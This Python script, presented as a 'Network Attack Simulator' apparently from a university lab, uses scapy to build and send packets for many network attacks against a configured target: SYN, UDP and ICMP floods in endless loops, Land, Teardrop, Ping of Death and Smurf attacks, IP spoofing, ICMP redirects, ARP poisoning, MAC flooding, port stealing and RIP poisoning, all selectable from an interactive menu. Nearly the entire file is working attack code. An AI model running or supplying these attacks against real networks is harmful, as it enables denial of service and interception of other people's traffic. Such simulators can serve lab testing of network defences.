#! /usr/bin/env python
from scapy.all import send, sr, IP, ICMP, ARP, RandIP, RandMAC, TCP, UDP, RIP, RIPEntry
from scapy.volatile import RandByte
import fileinput
import sys
import config
import threading
import time

def neg():
    print("test")
    print config.targetIPDestination
    return "test"

# Lower Level Runners #
def IPSweep(ipDestination): 
    packet = IP(dst=ipDestination) / ICMP() / config.LONG_PAYLOAD
    return packet
def PortScan(ipDestination): 
    packet = IP(dst=ipDestination) / TCP(dport=(1,2000), flags="S")
    return packet
def IPSpoof(ipDestination, ipSource):
    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / config.LONG_PAYLOAD
    return packet
def SFFlag(ipDestination): 
    packet = IP(dst=ipDestination) / TCP(flags="SF")
    return packet
def FFlag(ipDestination): 
    packet = IP(dst=ipDestination) / TCP(flags="F")
    return packet
def URGFlag(ipDestination):
    packet = IP(dst=ipDestination) / TCP(flags="U", dport=139)
    return packet
def NoFlag(ipDestination):
    packet = IP(dst=ipDestination) / TCP(flags="")
    return packet

# Denial of Service Attacks #
def SYNFlood(ipDestination):
    packet = IP(dst=ipDestination) / TCP(dport=80, flags="S")
    return packet
def ICMPFlood(ipDestination):
    #With unspoofed address
    packet = IP(dst=ipDestination) / ICMP() / config.LOAD_PAYLOAD
    return packet
def DropCommunication(ipDestination1, ipDestination2):
    packet1 = IP(dst=ipDestination1) / ICMP(type=3, code=1)
    packet2 = IP(dst=ipDestination2) / ICMP(type=3, code=1)
    return packet1, packet2
def ICMPRedirect(victim, attacker):
    packet = IP(dst=victim) / ICMP(type=5, code=1, gw=attacker)
    return packet
def UDPFlood(ipDestination):
    packet = IP(dst=ipDestination) / UDP(dport=20) / ( config.LONG_PAYLOAD * RandByte())
    return packet
def LandAttack(ipDestination):
    packet = IP(dst=ipDestination, src=ipDestination) / TCP(sport=139, dport=139, flags="S")
    return packet
def TeardropAttack(ipDestination):
    packet1 = IP(dst=ipDestination, flags="MF", id=12) / UDP() / ("X" * 100)
    packet2 = IP(dst=ipDestination, id=12, frag=2) / UDP() / ("X" * 2)
    return packet1, packet2
def PingOfDeath(ipDestination):
    packet = IP(dst=ipDestination) / ICMP() / ("X" * 65000)
    return packet
def Smurf(victim, spoof):
    packet = IP(src=victim, dst=spoof) / ICMP() / config.LONG_PAYLOAD
    return packet

# Man in the Middle Attacks
def ARPPoisoning():
    routerIp = config.targetIPDestination
    routerMac = config.ROUTER_MAC
    victimIp = config.VICTIM_IP
    victimMac = config.VICTIM_MAC
    attackerMac = config.ATTACKER_MAC
    packet1 = ARP(op = 2, hwsrc=attackerMac, psrc=victimIp, hwdst=routerMac, pdst=routerIp)
    packet2 = ARP(op = 2, hwsrc=attackerMac, psrc=routerIp, hwdst=victimMac, pdst=victimIp)
    return packet1, packet2
def MACFlood():
    packet = ARP(op=2, psrc=RandIP(), hwsrc=RandMAC(), pdst=RandIP(), hwdst=RandMAC())
    return packet
def PortStealing():
    victimMac = config.VICTIM_MAC
    attackerMac = config.ATTACKER_MAC
    packet = ARP(op=2, psrc=RandIP(), hwsrc=victimMac, pdst=RandIP(), hwdst=attackerMac)
    return packet
def RIPPoisoning():
    packet = IP(dst="224.0.0.9", ttl=1) / UDP(dport=520, sport=520) / RIP(cmd=2, version=2)/RIPEntry()
    return packet

def subSweep(ip):
    packet = IPSweep(ip)
    send(packet)

# Higher Level Runners #
def RunIPSweep(): 
    for i in range(40, 70):
        for j in range(0, 56):
            t=threading.Timer(0.05,subSweep,["192.168."+str(i)+"."+str(j)])
            t.start()
        time.sleep(2)


    #send(packet, inter=0.005)
    return "IPSweep"

def RunIPSweep():
    for i in range(40, 70):
        for j in range(0, 56):
            t=threading.Timer(0.05,subSweep,["192.168."+str(i)+"."+str(j)])
            t.start()
        time.sleep(2)
    return "RunIPSweep"

def RunPortScan(): 
    packet = PortScan(config.targetIPDestination)
    sr(packet, inter=0.005)
    return "RunPortScan"
def RunIPSpoof():
    packet = IPSpoof(config.targetIPDestination, "192.168.1.117")
    send(packet)
    return "IPSpoof"
def RunSFFlag(): 
    packet = SFFlag(config.targetIPDestination)
    send(packet)
    return "SFFlag"
def RunFFlag(): 
    packet = FFlag(config.targetIPDestination)
    send(packet)
    return "FFlag"
def RunURGFlag():
    packet = URGFlag(config.targetIPDestination)
    send(packet)
    return "URGFlag"
def RunNoFlag():
    packet = NoFlag(config.targetIPDestination)
    send(packet)
    return "NoFlag"
def RunSYNFlood():
    packet = SYNFlood(config.targetIPDestination)
    while True:
        send(packet)
    return "SYNFlood"
def RunICMPFlood():
    packet = ICMPFlood(config.targetIPDestination)
    send(packet)
    return "ICMPFlood"
def RunDropCommunication():
    packets = DropCommunication(config.targetIPDestination, "192.168.1.2")
    send(packets[0])
    send(packets[1])
    return "DropCommunication"
def RunICMPRedirect():
    packet = ICMPRedirect(config.targetIPDestination, "192.168.1.117")
    send(packet)
    return "ICMPRedirect"
def RunUDPFlood():
    packet = UDPFlood(config.targetIPDestination)
    while True:
        send(packet)
    return "UDPFlood"
def RunLandAttack():
    packet = LandAttack(config.targetIPDestination)
    send(packet)
    return "LandAttack"
def RunTeardropAttack():
    packets = TeardropAttack(config.targetIPDestination)
    send(packets[0])
    send(packets[1])
    return "TeardropAttack"
def RunPingOfDeath():
    packet = PingOfDeath(config.targetIPDestination)
    while True:
        send(packet)
    return "PingOfDeath"
def RunARPPoisoning():
    packets = ARPPoisoning()
    print("packet 0 =" + str(packets[0]))
    print("packet 1 =" + str(packets[1]))
    print("Sending both packets...")
    send(packets[0])
    send(packets[1])
    print("complete.")
    return "RunARPPoisoning"
def RunSmurf():
    while True:
        for router in config.routers:
            packet = Smurf(config.targetIPDestination, router)
            send(packet)
def RunMACFlood():
    packet = MACFlood()
    print(packet)
    return "RunMACFlood"
def RunPortStealing():
    packet = PortStealing()
    send(packet)
    return "RunPortStealing"
def RunRIPPoisoning():
    packet = RIPPoisoning()
    print(packet)
    send(packet, inter=30, loop=1)
    return "RunRIPPoisoning"

def runnerHelper():
    functionTable = [
    "RunIPSweep():",
    "RunPortScan():",
    "RunIPSpoof()",
    "RunSFFlag():",
    "RunFFlag():",
    "RunURGFlag()",
    "RunNoFlag()",
    "RunSYNFlood()",
    "RunICMPFlood()",
    "RunDropCommunication()",
    "RunICMPRedirect()",
    "RunUDPFlood()",
    "RunLandAttack()",
    "RunTeardropAttack()",
    "RunPingOfDeath()",
    "RunARPPoisoning()",
    "RunMACFlood()",
    "RunPortStealing()",
    "RunRIPPoisoning()" ]

    print("  ---Welcome to the Network Attack Simulator---")
    print("\t\t*** Cal Poly ***")
    print("Please enter a command. Targets can be modified in the configuration file.")
    for i in range (0, len(functionTable)):
        print("["+str(i)+"]-"+functionTable[i])

def runner(argument, args):
    switcher = {
      "-1": neg,
      "0": RunIPSweep,
      "1": RunPortScan,
      "2": RunIPSpoof,
      "3": RunSFFlag,
      "4": RunFFlag,
      "5": RunURGFlag,
      "6": RunNoFlag,
      "7": RunSYNFlood,
      "8": RunICMPFlood,
      "9": RunDropCommunication, "10": RunICMPRedirect,
      "11": RunUDPFlood,
      "12": RunLandAttack,
      "13": RunTeardropAttack,
      "14": RunPingOfDeath,
      "15": RunARPPoisoning,
      "16": RunMACFlood,
      "17": RunPortStealing,
      "18": RunRIPPoisoning,
      "19": RunSmurf,
    }
    func = switcher.get(argument, lambda: "nothing")
    print(func)
    return func()

runnerHelper()
while True:
    myInput = raw_input("Enter Attack\n")
    if (len(myInput)) > 0:
        runner(myInput, sys.argv);

